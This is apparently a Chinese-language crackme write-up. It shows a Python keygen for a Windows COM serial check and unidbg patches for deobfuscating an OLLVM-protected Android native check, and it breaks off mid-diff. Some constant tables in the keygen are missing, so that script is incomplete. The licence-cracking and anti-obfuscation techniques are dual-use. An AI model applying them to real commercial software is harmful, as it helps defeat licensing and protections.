Windows SDK 里找到 oleview 工具(我的电脑上在 C:\Program Files (x86)\Windows Kits\10\bin\10.0.22621.0\x86\oleview.exe)，File 菜单下选 View Typelib，选择服务端程序，可以得到 RPC 接口的 IDL：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">// Generated .IDL file (by the OLE/COM Object Viewer)</span><br /><span style="color: rgb(124, 124, 124);">// </span><br /><span style="color: rgb(124, 124, 124);">// typelib filename: crackme2024service.exe</span><br /><br />[<br />  <span style="color: rgb(255, 255, 182);">uuid</span>(E5F1A4DB-E66F-<span style="color: rgb(255, 115, 253);">4</span>F2E-B98D-<span style="color: rgb(255, 115, 253);">7E6</span>E33D6C9A6),<br />  <span style="color: rgb(255, 255, 182);">version</span>(<span style="color: rgb(255, 115, 253);">1.0</span>),<br />  <span style="color: rgb(255, 255, 182);">custom</span>(DE77BA64-<span style="color: rgb(255, 115, 253);">517</span>C-<span style="color: rgb(255, 115, 253);">11</span>D1-A2DA-<span style="color: rgb(255, 115, 253);">0000</span>F8773CE9, <span style="color: rgb(255, 115, 253);">134218331</span>),<br />  <span style="color: rgb(255, 255, 182);">custom</span>(DE77BA63-<span style="color: rgb(255, 115, 253);">517</span>C-<span style="color: rgb(255, 115, 253);">11</span>D1-A2DA-<span style="color: rgb(255, 115, 253);">0000</span>F8773CE9, <span style="color: rgb(255, 115, 253);">1707276290</span>),<br />  <span style="color: rgb(255, 255, 182);">custom</span>(DE77BA65-<span style="color: rgb(255, 115, 253);">517</span>C-<span style="color: rgb(255, 115, 253);">11</span>D1-A2DA-<span style="color: rgb(255, 115, 253);">0000</span>F8773CE9, <span style="color: rgb(168, 255, 96);">"Created by MIDL version 8.00.0603 at Wed Feb 07 11:24:49 2024<br />"</span>)<br /><br />]<br />library crackme2024serviceLib<br />{<br />    <span style="color: rgb(124, 124, 124);">// TLib : OLE Automation : {00020430-0000-0000-C000-000000000046}</span><br />    <span style="color: rgb(255, 255, 182);">importlib</span>(<span style="color: rgb(168, 255, 96);">"stdole2.tlb"</span>);<br /><br />    <span style="color: rgb(124, 124, 124);">// Forward declare all types defined in this typelib</span><br />    interface IATLCrackmeObject;<br /><br />    [<br />      <span style="color: rgb(255, 255, 182);">uuid</span>(E31B66BC-<span style="color: rgb(255, 115, 253);">893</span>B-<span style="color: rgb(255, 115, 253);">4269</span>-<span style="color: rgb(255, 115, 253);">8</span>C01-<span style="color: rgb(255, 115, 253);">14</span>F95AF8CDCD)<br />    ]<br />    coclass ATLCrackmeObject {<br />        [default] interface IATLCrackmeObject;<br />    };<br /><br />    [<br />      odl,<br />      <span style="color: rgb(255, 255, 182);">uuid</span>(<span style="color: rgb(255, 115, 253);">384</span>C7517-B706-<span style="color: rgb(255, 115, 253);">4958</span>-AB87-<span style="color: rgb(255, 115, 253);">6</span>EE5925674B2),<br />      dual,<br />      nonextensible,<br />      oleautomation<br />    ]<br />    interface IATLCrackmeObject : IDispatch {<br />        [<span style="color: rgb(255, 255, 182);">id</span>(<span style="color: rgb(255, 115, 253);">0x00000001</span>), <span style="color: rgb(255, 255, 182);">helpstring</span>(<span style="color: rgb(168, 255, 96);">"method: Method1()"</span>)]<br />        HRESULT <span style="color: rgb(255, 255, 182);">setUID</span>([<span style="color: rgb(150, 203, 254);">in</span>] unsigned int id);<br />        [<span style="color: rgb(255, 255, 182);">id</span>(<span style="color: rgb(255, 115, 253);">0x00000002</span>), <span style="color: rgb(255, 255, 182);">helpstring</span>(<span style="color: rgb(168, 255, 96);">"method: Method2()"</span>)]<br />        HRESULT <span style="color: rgb(255, 255, 182);">setSerial</span>([<span style="color: rgb(150, 203, 254);">in</span>] unsigned <span style="color: rgb(255, 255, 182);">char</span> serial[<span style="color: rgb(255, 115, 253);">200</span>]);<br />        [<span style="color: rgb(255, 255, 182);">id</span>(<span style="color: rgb(255, 115, 253);">0x00000003</span>), <span style="color: rgb(255, 255, 182);">helpstring</span>(<span style="color: rgb(168, 255, 96);">"method: Method3()"</span>)]<br />        HRESULT <span style="color: rgb(255, 255, 182);">checkSerial</span>([out, retval] <span style="color: rgb(255, 255, 182);">char</span>* result);<br />        [<span style="color: rgb(255, 255, 182);">id</span>(<span style="color: rgb(255, 115, 253);">0x00000004</span>), <span style="color: rgb(255, 255, 182);">helpstring</span>(<span style="color: rgb(168, 255, 96);">"method: Method4()"</span>)]<br />        HRESULT <span style="color: rgb(255, 255, 182);">setCallback</span>([<span style="color: rgb(150, 203, 254);">in</span>] uint64 funPtr);<br />    };<br />};</code></pre><p>然后就是想个办法定位到服务端这些函数的位置，我找了半天找不到（事后反过来找发现可以从 <code style="font-family: SFMono-Regular, Consolas, ;">ATL::CComObject&lt;class CATLCrackmeObject&gt;</code>或<code style="font-family: SFMono-Regular, Consolas, ;">ATL::CComContainedObject&lt;class CATLCrackmeObject&gt;</code>的 vftable 入手(根据网上的例子可知，实际用户编写的类是个抽象类，其 vtable 并不实际生成(ATL_NO_VTABLE)，需要找到它的子类才有这些虚函数指针)）。</p><p>注意到客户端有一些共享内存的逻辑，猜测服务端也有，因此从相关函数的导入表开始查询交叉引用定位到了<code style="font-family: SFMono-Regular, Consolas, ;">ATL::CComObject&lt;class CATLCrackmeObject&gt;</code>的构造函数。</p><p>然后就是阅读整体逻辑：依次为 setUID、客户端跑共享内存中的代码、setSerial、checkSerial。</p><p>把 CATLCrackmeObject 类在 IDA 里定义出相应的结构体来，然后根据这些服务端函数依次还原每个字段的含义就差不多能看懂 checkSerial 的内容了。</p><p>最后 dump 出一些常量来就可以写还原 serial 的脚本了：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);"># note: unlicense require 32-bit python if you need unpack 32bit executable</span><br /><span style="color: rgb(124, 124, 124);"># using conda activate py310_32</span><br /><span style="color: rgb(124, 124, 124);"># or</span><br /><span style="color: rgb(168, 255, 96);">"""<br />conda create -n py310_32<br />conda activate py310_32<br />conda config --env --set subdir win-32<br />conda install python=3.10<br />"""</span><br /><span style="color: rgb(124, 124, 124);"># first use ole viewer at C:\Program Files (x86)\Windows Kits\10\bin\10.0.22621.0\x86\oleview.exe</span><br /><span style="color: rgb(124, 124, 124);"># File-&gt;View Typelib to read idl</span><br /><span style="color: rgb(124, 124, 124);"># find vtable for ATL::CComContainedObject&lt;class CATLCrackmeObject&gt;::`vftable'</span><br /><span style="color: rgb(124, 124, 124);"># or ATL::CComObject&lt;class CATLCrackmeObject&gt;::`vftable'</span><br /><span style="color: rgb(124, 124, 124);"># its own constructor will be ATL_NO_VTABLE</span><br /><span style="color: rgb(124, 124, 124);"># so search constructor for ATL::CComAggObject&lt;CATLCrackmeObject&gt; or ATL::CComObject&lt;class CATLCrackmeObject&gt;</span><br /><span style="color: rgb(124, 124, 124);">#691872</span><br /><span style="color: rgb(124, 124, 124);">#6F73F5E400</span><br /><span style="color: rgb(124, 124, 124);"># 36A8ADECAA4AEF73</span><br /><span style="color: rgb(124, 124, 124);">#12345678901234567890123456789012354</span><br /><span style="color: rgb(124, 124, 124);">#12131410-22232412-22232122-22232122</span><br /><span style="color: rgb(150, 203, 254);">from</span> struct <span style="color: rgb(150, 203, 254);">import</span> *<br />dword_41F8D4, =unpack(<span style="color: rgb(168, 255, 96);">'&lt;I'</span>, bytes.fromhex(<span style="color: rgb(168, 255, 96);">'20C8555E'</span>))<br />dword_41F8D0, =unpack(<span style="color: rgb(168, 255, 96);">'&lt;I'</span>, bytes.fromhex(<span style="color: rgb(168, 255, 96);">'D8AD2652'</span>))<br />cc = list(unpack(<span style="color: rgb(168, 255, 96);">'&lt;16I'</span>, bytes.fromhex(<span style="color: rgb(168, 255, 96);">'519E0AA3C206BB229417265A7393710C7813B847446653FEBCCB59467D55A4EB412FD560C4B26B3D1BF0159DB49E0D16BF07CAEC94CFD036379638AE9BB168F8'</span>)))<br /><br />dword_41F4D0=list(unpack(<span style="color: rgb(168, 255, 96);">'&lt;256I'</span>, bytes.fromhex(<span style="color: rgbspan>)))<br />dword_41F0D0=list(unpack(<span style="color: rgb(168, 255, 96);">'&lt;256I'</span>, bytes.fromhex(<span style="color: rgbspan>)))<br />dword_41E8D0=list(unpack(<span style="color: rgb(168, 255, 96);">'&lt;256I'</span>, bytes.fromhex(<span style="color: rgbspan>)))<br />dword_41ECD0=list(unpack(<span style="color: rgb(168, 255, 96);">'&lt;256I'</span>, bytes.fromhex(<span style="color: rgbspan>)))<br /><br /><span style="color: rgb(124, 124, 124);"># enc test</span><br /><span style="color: rgb(168, 255, 96);">"""<br />ori = bytes.fromhex('65f046ce94b5437a1e873878258d6781')<br />ans = b''<br />for t in range(0, 16, 8):<br />    v5, v7 = unpack('&lt;II', ori[t:t+8])<br />    for v8 in cc[::-1]:<br />        v9 = v5 ^ v8<br />        v5 = v7 ^ ((dword_41F4D0[(v9 &gt;&gt; 24) &amp; 0xff] + (dword_41F0D0[(v9 &gt;&gt; 16) &amp; 0xff] ^ ((dword_41E8D0[v9 &amp; 0xff] + dword_41ECD0[(v9 &gt;&gt; 8) &amp; 0xff]) &amp; 0xffffffff))) &amp; 0xffffffff)<br />        v7 = v9<br />    v10 = v5 ^ dword_41F8D4<br />    v11 = v9 ^ dword_41F8D0<br />    ans += pack('&lt;II', v11, v10)<br /><br />print(ans)<br />"""</span><br /><br />uid = int(input(<span style="color: rgb(168, 255, 96);">'uid: '</span>))<br />shared = uid<br /><span style="color: rgb(124, 124, 124);"># this logic also have anti-debug which can be bypass</span><br />shared = (shared * shared) &amp; <span style="color: rgb(255, 115, 253);">0xffffffffffffffff</span><br />shared = (shared * uid) &amp; <span style="color: rgb(255, 115, 253);">0xffffffffffffffff</span><br />shared ^= <span style="color: rgb(255, 115, 253);">0x323032796C6C6F73</span><br />ans = hex(shared)[<span style="color: rgb(255, 115, 253);">2</span>:].zfill(<span style="color: rgb(255, 115, 253);">16</span>).upper().encode()<br />print(<span style="color: rgb(168, 255, 96);">'shared:'</span>, hex(shared))<br />ans = ans.ljust(<span style="color: rgb(255, 115, 253);">16</span>, <span style="color: rgb(168, 255, 96);">b'\x00'</span>)<br />ori = <span style="color: rgb(168, 255, 96);">b''</span><br /><span style="color: rgb(150, 203, 254);">for</span> t <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">16</span>, <span style="color: rgb(255, 115, 253);">8</span>):<br />    v11, v10 = unpack(<span style="color: rgb(168, 255, 96);">'&lt;II'</span>, ans[t:t+<span style="color: rgb(255, 115, 253);">8</span>])<br />    v5 = v10 ^ dword_41F8D4<br />    v9 = v11 ^ dword_41F8D0<br />    <span style="color: rgb(150, 203, 254);">for</span> v8 <span style="color: rgb(150, 203, 254);">in</span> cc:<br />        v7 = v5 ^ ((dword_41F4D0[(v9 &gt;&gt; <span style="color: rgb(255, 115, 253);">24</span>) &amp; <span style="color: rgb(255, 115, 253);">0xff</span>] + (dword_41F0D0[(v9 &gt;&gt; <span style="color: rgb(255, 115, 253);">16</span>) &amp; <span style="color: rgb(255, 115, 253);">0xff</span>] ^ ((dword_41E8D0[v9 &amp; <span style="color: rgb(255, 115, 253);">0xff</span>] + dword_41ECD0[(v9 &gt;&gt; <span style="color: rgb(255, 115, 253);">8</span>) &amp; <span style="color: rgb(255, 115, 253);">0xff</span>]) &amp; <span style="color: rgb(255, 115, 253);">0xffffffff</span>))) &amp; <span style="color: rgb(255, 115, 253);">0xffffffff</span>)<br />        v5 = v9 ^ v8<br />        v9 = v7<br />    ori += pack(<span style="color: rgb(168, 255, 96);">'&lt;II'</span>, v5, v7)<br /><br />print(<span style="color: rgb(168, 255, 96);">'serial:'</span>, <span style="color: rgb(168, 255, 96);">'-'</span>.join(hex(v)[<span style="color: rgb(255, 115, 253);">2</span>:].zfill(<span style="color: rgb(255, 115, 253);">8</span>) <span style="color: rgb(150, 203, 254);">for</span> v <span style="color: rgb(150, 203, 254);">in</span> unpack(<span style="color: rgb(168, 255, 96);">'&lt;4I'</span>, ori)))</code></pre><h2>Android 高级题</h2><p>jadx打开看到的逻辑为：传入补充前导0到8个字节的uid字符串的md5和一个不小于100字节的字符串到native函数checkSn，返回true即为成功。</p><p>因为感觉和去年的 Android 高级题差不多，所以看了下去年的题解，发现主要思路就是调用JNI_OnLoad得知校验函数地址后unidbg运行它，然后多打日志慢慢看。</p><p>打开unidbg发现里面还有没做完的去年的Android高级题，于是决定今年的这题得把它做出来QAQ。</p><p>去年的题解似乎更多是进行数据流分析+猜测，但个人更喜欢分析清楚控制流。</p><h3>去混淆</h3><h4>概览</h4><p>这题应用了朴素的 ollvm（控制流扁平化+虚假控制流）+间接调用/间接条件跳转（值得注意的是一些用于计算实际跳转地址的常量还可能会通过函数的第一个参数传递下去，下面我在这些函数的名字上标上 Internal）+字符串加密。</p><p>分析 ollvm 只要找到主分发器（或预处理器，即真实块的后继）的位置并在 unidbg 里打断点、执行到这里时打出当前状态变量（即分发器选择作为跳转目标的真实块所依据的寄存器）的值，基本就能手动连起来看了（因为这里到达真实块前的最后一次条件跳转几乎总是 状态变量!=进入主分发器时状态变量的值）。</p><p>而虚假控制流可以用新版 IDA 内置的 gooMBA（也可以将其移植到 旧版 IDA 上）去除。也可以用 D-810 去除，但比较慢。</p><p>间接调用/间接条件跳转则把 IDA/hexrays 干懵了（以下内容找个 view microcode 的插件观察即可得知）：</p><ol><li style="margin-left: 2px;"><p>因为 hexrays F5 一开始就会划分基本块+得到控制流图，而这时间接跳转的目标地址还没被常量折叠出来（为了避免阻止自动常量折叠，需要将 .data section 改为只读）。由于这些基本块在控制流分析时就被丢掉了，因此即使手动确保把跳转目标块处于 IDA 识别的正确的函数中，hexrays 也会显示JUMPOUT。</p></li><li style="margin-left: 2px;"><p>而一部分 call 会显示为一个明显可以常量折叠的表达式，但 hexrays 在全局优化阶段才有条件折叠出这些值来（因为这些表达式中包含一个只在首个基本块里修改的变量，而其他基本块在局部优化阶段无从得知这个变量是固定的），而这时已经过了调用分析阶段了。</p></li></ol><p>至于 ghidra/binja 表现的更差（binja 把 .data 标记为只读后 HLIL 一直在两种结果间切换显示，不知道发生了什么），也就不考虑了。</p><p>因为本菜鸡并不会让 hexrays 的这些分析阶段反复跑多遍，因此考虑用unidbg得到间接跳转/调用的目标，将相关代码直接 patch 成直接跳转和直接调用来使得 hexrays 恢复分析能力。</p><p>换言之整个流程就是：</p><ol><li style="margin-left: 2px;"><p>运行 unidbg 记录跳转目标</p></li><li style="margin-left: 2px;"><p>根据记录 patch i64</p></li><li style="margin-left: 2px;"><p>阅读 hexrays 输出（结合主分发器处 unidbg 断点输出的日志；对于复杂内容可能需要对部分函数打断点打印入参和返回值）了解本次运行发生了什么</p></li><li style="margin-left: 2px;"><p>调整输入和补充unidbg代码使得程序能继续正常运行</p></li><li style="margin-left: 2px;"><p>回到1，直到分析出整个验证成功的路径</p></li></ol><h4>间接调用处理</h4><p>由于整个程序没有虚表调用（除去调用JNI functions），因此可以patch几乎（除去JNI calls）所有BLR X*指令为BL [X*]指令。</p><p>我一开始是在整个 module 下进行 unicorn code hook，发现当前是 BLR 指令就标记一个变量，code hook 开始时发现该变量置位（也就跑下一条指令时），记录下跳转目标地址。这样的做法的问题是对于跳到 module 外的 CALL，记录的跳转目标是 PC+4(我一开始还把这个当假NOP了QAQ)。因此我将记录方式修改为了 BLR 指令运行时直接读取 X* 寄存器的值来得到跳转目标地址。</p><p>值得注意的是，对于外部调用，会使用一个被动态链接器重定位为（调用目标+常量）的值来算出（调用目标），而 unidbg 里对于这种重定位项的实现是错误的，需要修复：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">diff --git a/unidbg-android/src/main/java/com/github/unidbg/linux/ModuleSymbol.java b/unidbg-android/src/main/java/com/github/unidbg/linux/ModuleSymbol.java<br />index 3bba96cf..b0402590 <span style="color: rgb(255, 115, 253);">100644</span><br />--- a/unidbg-android/src/main/java/com/github/unidbg/linux/ModuleSymbol.java<br />+++ b/unidbg-android/src/main/java/com/github/unidbg/linux/ModuleSymbol.java<br />@@ -<span style="color: rgb(255, 115, 253);">37</span>,<span style="color: rgb(255, 115, 253);">7</span> +<span style="color: rgb(255, 115, 253);">37</span>,<span style="color: rgb(255, 115, 253);">7</span> @@ <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">ModuleSymbol</span> {<br />             <span style="color: rgb(255, 255, 182);">LinuxModule</span> <span style="color: rgb(198, 197, 254);">module</span> = (LinuxModule) m;<br />             <span style="color: rgb(255, 255, 182);">Long</span> <span style="color: rgb(198, 197, 254);">symbolHook</span> = <span style="color: rgb(150, 203, 254);">module</span>.hookMap.get(symbolName);<br />             <span style="color: rgb(150, 203, 254);">if</span> (symbolHook != <span style="color: rgb(198, 197, 254);">null</span>) {<br />-                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ModuleSymbol</span>(soName, WEAK_BASE, symbol, relocationAddr, <span style="color: rgb(150, 203, 254);">module</span>.name, symbolHook);<br />+                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ModuleSymbol</span>(soName, WEAK_BASE, symbol, relocationAddr, <span style="color: rgb(150, 203, 254);">module</span>.name, symbolHook + offset);<br />             }<br /><br />             <span style="color: rgb(255, 255, 182);">ElfSymbol</span> <span style="color: rgb(198, 197, 254);">elfSymbol</span> = <span style="color: rgb(150, 203, 254);">module</span>.getELFSymbolByName(symbolName);<br />@@ -<span style="color: rgb(255, 115, 253);">46</span>,<span style="color: rgb(255, 115, 253);">10</span> +<span style="color: rgb(255, 115, 253);">46</span>,<span style="color: rgb(255, 115, 253);">10</span> @@ <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">ModuleSymbol</span> {<br />                     <span style="color: rgb(150, 203, 254);">case</span> ElfSymbol.BINDING_GLOBAL:<br />                     <span style="color: rgb(150, 203, 254);">case</span> ElfSymbol.BINDING_WEAK:<br />                         <span style="color: rgb(150, 203, 254);">for</span> (HookListener listener : listeners) {<br />-                            <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">hook</span> = listener.hook(svcMemory, <span style="color: rgb(150, 203, 254);">module</span>.name, symbolName, <span style="color: rgb(150, 203, 254);">module</span>.base + elfSymbol.value + offset);<br />+                            <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">hook</span> = listener.hook(svcMemory, <span style="color: rgb(150, 203, 254);">module</span>.name, symbolName, <span style="color: rgb(150, 203, 254);">module</span>.base + elfSymbol.value);<br />                             <span style="color: rgb(150, 203, 254);">if</span> (hook &gt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />                                 <span style="color: rgb(150, 203, 254);">module</span>.hookMap.put(symbolName, hook);<br />-                                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ModuleSymbol</span>(soName, WEAK_BASE, elfSymbol, relocationAddr, <span style="color: rgb(150, 203, 254);">module</span>.name, hook);<br />+                                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ModuleSymbol</span>(soName, WEAK_BASE, elfSymbol, relocationAddr, <span style="color: rgb(150, 203, 254);">module</span>.name, hook + offset);<br />                             }<br />                         }</code></pre><p>然后由于有些调用的目标不是模块内函数，我们需要知道的不是调用目标的地址，而是符号名（有点类似于Windows脱壳的导入表修复）。</p><p>虽然 unidbg 提供的 findClosestSymbolByAddress 函数可通过指针来反推符号，但并不支持对于createVirtualModule创建的用Java代码实现的虚拟Module以及用Loader::addHookListener添加的钩子拦截的符号解析，为了完成反推，需要增加相关功能：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">diff --git a/unidbg-api/src/main/java/com/github/unidbg/spi/AbstractLoader.java b/unidbg-api/src/main/java/com/github/unidbg/spi/AbstractLoader.java<br />index 8dd3d0b8..c5513e3e <span style="color: rgb(255, 115, 253);">100644</span><br />--- a/unidbg-api/src/main/java/com/github/unidbg/spi/AbstractLoader.java<br />+++ b/unidbg-api/src/main/java/com/github/unidbg/spi/AbstractLoader.java<br />@@ -<span style="color: rgb(255, 115, 253);">28</span>,<span style="color: rgb(255, 115, 253);">12</span> +<span style="color: rgb(255, 115, 253);">28</span>,<span style="color: rgb(255, 115, 253);">7</span> @@ <span style="color: rgb(150, 203, 254);">import</span> java.io.IOException;<br /> <span style="color: rgb(150, 203, 254);">import</span> java.io.OutputStream;<br /> <span style="color: rgb(150, 203, 254);">import</span> java.nio.charset.StandardCharsets;<br /> <span style="color: rgb(150, 203, 254);">import</span> java.nio.file.Files;<br />-<span style="color: rgb(150, 203, 254);">import</span> java.util.ArrayList;<br />-<span style="color: rgb(150, 203, 254);">import</span> java.util.Arrays;<br />-<span style="color: rgb(150, 203, 254);">import</span> java.util.Collection;<br />-<span style="color: rgb(150, 203, 254);">import</span> java.util.List;<br />-<span style="color: rgb(150, 203, 254);">import</span> java.util.Map;<br />-<span style="color: rgb(150, 203, 254);">import</span> java.util.TreeMap;<br />+<span style="color: rgb(150, 203, 254);">import</span> java.util.*;<br /><br /> <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">abstract</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">AbstractLoader</span>&lt;T <span style="color: rgb(150, 203, 254);">extends</span> <span style="color: rgb(255, 255, 182);">NewFileIO</span>&gt; <span style="color: rgb(150, 203, 254);">implements</span> <span style="color: rgb(255, 255, 182);">Memory</span>, Loader {<br /><br />@@ -<span style="color: rgb(255, 115, 253);">249</span>,<span style="color: rgb(255, 115, 253);">9</span> +<span style="color: rgb(255, 115, 253);">244</span>,<span style="color: rgb(255, 115, 253);">21</span> @@ <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">abstract</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">AbstractLoader</span>&lt;T <span style="color: rgb(150, 203, 254);">extends</span> <span style="color: rgb(255, 255, 182);">NewFileIO</span>&gt; <span style="color: rgb(150, 203, 254);">implements</span> <span style="color: rgb(255, 255, 182);">Memory</span>, Loa<br /><br />     <span style="color: rgb(150, 203, 254);">protected</span> <span style="color: rgb(150, 203, 254);">final</span> List&lt;HookListener&gt; hookListeners = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>&lt;&gt;();<br /><br />+    <span style="color: rgb(150, 203, 254);">protected</span> <span style="color: rgb(150, 203, 254);">final</span> Map&lt;Long, HookedSymbol&gt; hookedSymbolMap = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashMap</span>&lt;&gt;();<br />+<br />+    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">final</span> HookedSymbol <span style="color: rgb(255, 255, 182);">findHookedSymbol</span>(<span style="color: rgb(255, 255, 182);">long</span> address) {<br />+        <span style="color: rgb(150, 203, 254);">return</span> hookedSymbolMap.get(address);<br />+    }<br />+<br />     <span style="color: rgb(124, 124, 124);">@Override</span><br />     <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">final</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">addHookListener</span>(HookListener listener) {<br />-        hookListeners.add(listener);<br />+        hookListeners.add((svcMemory, libraryName, symbolName, old) -&gt; {<br />+            <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">addr</span> = listener.hook(svcMemory, libraryName, symbolName, old);<br />+            <span style="color: rgb(150, 203, 254);">if</span> (addr &gt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />+                hookedSymbolMap.put(addr, <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HookedSymbol</span>(addr, libraryName, symbolName));<br />+            }<br />+            <span style="color: rgb(150, 203, 254);">return</span> addr;<br />+        });<br />     }<br /><br />     <span style="color: rgb(150, 203, 254);">protected</span> LibraryResolver libraryResolver;<br />diff --git a/unidbg-api/src/main/java/com/github/unidbg/spi/HookedSymbol.java b/unidbg-api/src/main/java/com/github/unidbg/spi/HookedSymbol.java<br />index 2017dda2..0a657f20 <span style="color: rgb(255, 115, 253);">100644</span><br />+++ b/unidbg-api/src/main/java/com/github/unidbg/spi/HookedSymbol.java<br />@@ -<span style="color: rgb(255, 115, 253);">1</span>,<span style="color: rgb(255, 115, 253);">2</span> +<span style="color: rgb(255, 115, 253);">1</span>,<span style="color: rgb(255, 115, 253);">25</span> @@<br />+<span style="color: rgb(150, 203, 254);">package</span> com.github.unidbg.spi;<br />+<br />+<span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">HookedSymbol</span> {<br />+    <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">final</span> <span style="color: rgb(255, 255, 182);">long</span> address;<br />+    <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">final</span> String library;<br />+    <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">final</span> String symbol;<br />+<br />+    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(255, 255, 182);">HookedSymbol</span>(<span style="color: rgb(255, 255, 182);">long</span> address, String library, String symbol) {<br />+        this.address = address;<br />+        this.library = library;<br />+        this.symbol = symbol;<br />+    }<br />+<br />+    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(255, 255, 182);">getAddress</span>() {<br />+        <span style="color: rgb(150, 203, 254);">return</span> address;<br />+    }<br />+<br />+    <span style="color: rgb(150, 203, 254);">public</span> String <span style="color: rgb(255, 255, 182);">getLibrary</span>() {<br />+        <span style="color: rgb(150, 203, 254);">return</span> library;<br />+    }<br />+<br />+    <span style="color: rgb(150, 203, 254);">public</span> String <span style="color: rgb(255, 255, 182);">getSymbol</span>() {<br />+        <span style="color: rgb(150, 203, 254);">return</span> symbol;<br />+    }<br />+ }<br />diff --git a/unidbg-api/src/main/java/com/github/unidbg/spi/Loader.java b/unidbg-api/src/main/java/com/github/unidbg/spi/Loader.java<br />index af1b3b7b..36010f5c <span style="color: rgb(255, 115, 253);">100644</span><br />--- a/unidbg-api/src/main/java/com/github/unidbg/spi/Loader.java<br />+++ b/unidbg-api/src/main/java/com/github/unidbg/spi/Loader.java<br />@@ -<span style="color: rgb(255, 115, 253);">38</span>,<span style="color: rgb(255, 115, 253);">6</span> +<span style="color: rgb(255, 115, 253);">38</span>,<span style="color: rgb(255, 115, 253);">8</span> @@ <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">interface</span> <span style="color: rgb(255, 255, 182);">Loader</span> {<br /><br />     <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">addHookListener</span>(HookListener listener);<br /><br />+    HookedSymbol <span style="color: rgb(255, 255, 182);">findHookedSymbol</span>(<span style="color: rgb(255, 255, 182);">long</span> address);<br />+<br />     Collection&lt;Module&gt; <span style="color: rgb(255, 255, 182);">getLoadedModules</span>();<br /><br />     String <span style="color: rgb(255, 255, 182);">getMaxLengthLibraryName</span>();<br />diff --git a/unidbg-android/src/main/java/com/github/unidbg/linux/LinuxModule.java b/unidbg-android/src/main/java/com/github/unidbg/linux/LinuxModule.java<br />index 1798821e..d804c582 <span style="color: rgb(255, 115, 253);">100644</span><br />--- a/unidbg-android/src/main/java/com/github/unidbg/linux/LinuxModule.java<br />+++ b/unidbg-android/src/main/java/com/github/unidbg/linux/LinuxModule.java<br />@@ -<span style="color: rgb(255, 115, 